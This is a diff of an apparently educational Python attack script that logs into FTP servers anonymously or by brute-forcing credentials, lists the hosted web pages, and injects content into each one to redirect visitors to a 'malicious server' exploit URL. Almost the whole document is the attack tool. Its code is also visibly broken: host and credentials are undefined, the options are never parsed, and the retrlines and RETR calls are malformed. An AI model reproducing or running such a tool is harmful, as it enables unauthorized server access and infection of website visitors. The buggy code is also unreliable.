@@ -2,6 +2,7 @@ import ftplib
 import optparse
 
 MALICIOUS_SERVER = '192.168.1.154:8000/exploit'
+ANONYMOUS_LOGIN = False
 
 def loginWithAnonymous(host):
 
@@ -38,6 +39,7 @@ def loginBruteForce(host, credentials):
     return None
 
 def directoryListing(ftpConnection):
+
     try:
         directory = ftpConnection.nlist()
 
@@ -53,6 +55,7 @@ def directoryListing(ftpConnection):
     return webFiles
 
 def maliciousInjection(ftpConnection, page):
+
     temporaryInjectionFile = open(page + '.tmp', 'w')
 
     ftpConnection.retrlines('RETR' + page, temporaryInjectionFile.write())
@@ -64,7 +67,23 @@ def maliciousInjection(ftpConnection, page):
 
 
 def main():
-    command = optparse.OptionParser('usage%prog -h ')
+
+    command = optparse.OptionParser('usage%prog -h <target host>')
+    command.add_option('-h', dest='target', type='string', help='specify the target of this specific attack')
+
+    if loginWithAnonymous(host):
+        ftpConnection = ftplib.FTP(host)
+        ftpConnection.login('Anonymous', 'hellofrom@gmail.com')
+
+    else:
+        username, password = loginBruteForce(host, credentials)
+        ftpConnection = ftplib.FTP(host)
+        ftpConnection.login(username, password)
+
+    webPages = directoryListing(ftpConnection)
+
+    for webpage in webPages:
+        maliciousInjection(ftpConnection, webpage)
 
 if __name__ == "__main__":
     main()
